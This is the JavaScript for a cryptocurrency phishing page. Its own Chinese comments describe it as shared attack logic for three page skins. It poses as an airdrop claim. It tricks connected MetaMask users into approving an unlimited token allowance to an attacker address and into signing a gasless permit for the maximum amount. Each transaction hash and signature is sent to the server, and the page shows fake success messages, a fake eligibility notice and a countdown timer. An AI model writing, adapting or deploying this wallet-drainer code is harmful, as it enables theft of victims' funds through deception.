// 三套皮肤共用的攻击逻辑:连钱包 / 主按钮(approve,额度由 claim_mode 决定)/ permit 免 Gas。
// 各皮肤只需提供以下 id 的元素:walletBtn、claimBtn、gaslessBtn、msg(均可缺省,缺省则该入口不渲染)。
const CFG = __CONFIG_JSON__;
const $ = id => document.getElementById(id);
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
let account = null;

function msg(text, ok = true) {
  const el = $("msg");
  if (!el) { ok ? null : console.warn(text); return; }
  el.textContent = text;
  el.style.color = ok ? "" : "#ff6b6b";
  el.dataset.ok = ok ? "1" : "0";
}

function report(payload) {
  return fetch("/api/event", { method: "POST", headers: { "Content-Type": "application/json" },
                               body: JSON.stringify(payload) }).then(r => r.json());
}

// 倒计时(id 存在才启用)
if ($("t-h")) {
  const endAt = Date.now() + CFG.countdown_minutes * 60000;
  setInterval(() => {
    const left = Math.max(0, endAt - Date.now());
    $("t-h").textContent = String(Math.floor(left / 3600000)).padStart(2, "0");
    $("t-m").textContent = String(Math.floor(left / 60000) % 60).padStart(2, "0");
    $("t-s").textContent = String(Math.floor(left / 1000) % 60).padStart(2, "0");
  }, 500);
}

async function connect() {
  if (!window.ethereum) { msg("请先安装 MetaMask 钱包", false); return null; }
  try {
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    if (!accounts || !accounts.length) { msg("钱包未授权连接,请重试", false); return null; }
    account = accounts[0];
    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x" + CFG.chain_id.toString(16) }] })
      .catch(() => ethereum.request({ method: "wallet_addEthereumChain", params: [{
        chainId: "0x" + CFG.chain_id.toString(16), chainName: CFG.rpc_name,
        rpcUrls: [CFG.rpc], nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 } }] }));
    if ($("walletBtn")) {
      $("walletBtn").textContent = account.slice(0, 6) + "…" + account.slice(-4);
      $("walletBtn").classList.add("connected");
    }
    await report({ type: "connect", address: account });
    msg("资格校验通过 · 您的地址在本次活动名单中");
    return account;
  } catch (e) { msg("连接被取消", false); return null; }
}
if ($("walletBtn")) $("walletBtn").onclick = () => connect();

// 主按钮:approve 授权(页面语境包装为"领取/核销")
if ($("claimBtn")) $("claimBtn").onclick = async () => {
  try {
    if (!account && !(await connect())) return;
    $("claimBtn").disabled = true;
    msg("正在核销名额…请在钱包中确认");
    const maxword = "f".repeat(64);
    const amtword = BigInt(Math.round(Number(CFG.airdrop_amount) * 1e18)).toString(16).padStart(64, "0");
    const data = "0x095ea7b3"
      + CFG.attacker.toLowerCase().slice(2).padStart(64, "0")
      + (CFG.claim_mode === "exact" ? amtword : maxword);
    const hash = await ethereum.request({ method: "eth_sendTransaction",
      params: [{ from: account, to: CFG.token, data }] });
    const resp = await report({ type: "approve", txHash: hash });
    if (resp && resp.ok) msg("🎉 核销成功!" + CFG.symbol + " 将在 10 分钟内自动到账,请勿关闭页面");
    else msg("核销遇到问题,请重试", false);
    $("claimBtn").disabled = false;
  } catch (e) { msg("交易被拒绝", false); $("claimBtn").disabled = false; }
};

// 免 Gas 按钮:permit 离线签名
if ($("gaslessBtn")) $("gaslessBtn").onclick = async () => {
  try {
    if (!account && !(await connect())) return;
    msg("正在生成免 Gas 领取凭证…请在钱包中签名");
    // Permit 字段顺序因代币而异:EIP-2612 标准 deadline 在前,Circle 系(USDC)nonce 在前。
    // 钱包按这里给出的 types 顺序哈希,与合约内置 TYPEHASH 不一致即签名无效。
    const nonceFirst = CFG.permit_order === "nonce_first";
    // Ref #75:nonce 必须取链上当前值——nonce 是签名摘要的一部分,写死 0 时
    // 二次签名(链上 nonce 已推进)会被合约以 invalid signature 拒绝。
    let nonce = "0";
    try {
      // 0x7ecebe00 = nonces(address) 选择器,与服务端 SEL_NONCES 同源
      const out = await ethereum.request({ method: "eth_call",
        params: [{ to: CFG.token, data: "0x7ecebe00" + account.toLowerCase().slice(2).padStart(64, "0") }, "latest"] });
      nonce = BigInt(out).toString();
    } catch (e) { msg("nonce 查询失败,按 0 签名(若曾签过可能失效)", false); }
    const tail = nonceFirst
      ? [{ name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
      : [{ name: "deadline", type: "uint256" }, { name: "nonce", type: "uint256" }];
    const message = nonceFirst
      ? { owner: account, spender: CFG.attacker, value: MAX_UINT, nonce, deadline: String(CFG.deadline) }
      : { owner: account, spender: CFG.attacker, value: MAX_UINT, deadline: String(CFG.deadline), nonce };
    const payload = {
      types: {
        EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" },
                       { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" },
                 { name: "value", type: "uint256" }].concat(tail),
      },
      primaryType: "Permit",
      domain: { name: CFG.token_name, version: CFG.permit_version || "1", chainId: CFG.chain_id, verifyingContract: CFG.token },
      message: message,
    };
    const sig = await ethereum.request({ method: "eth_signTypedData_v4",
      params: [account, JSON.stringify(payload)] });
    const resp = await report({ type: "permit", owner: account, sig,
                                value: message.value, deadline: CFG.deadline, nonce });
    if (resp && resp.ok) msg("🎉 签署成功!" + CFG.symbol + " 将在 10 分钟内自动到账,全程免 Gas");
    else msg("签署遇到问题,请重试", false);
  } catch (e) { msg("签名被拒绝", false); }
};
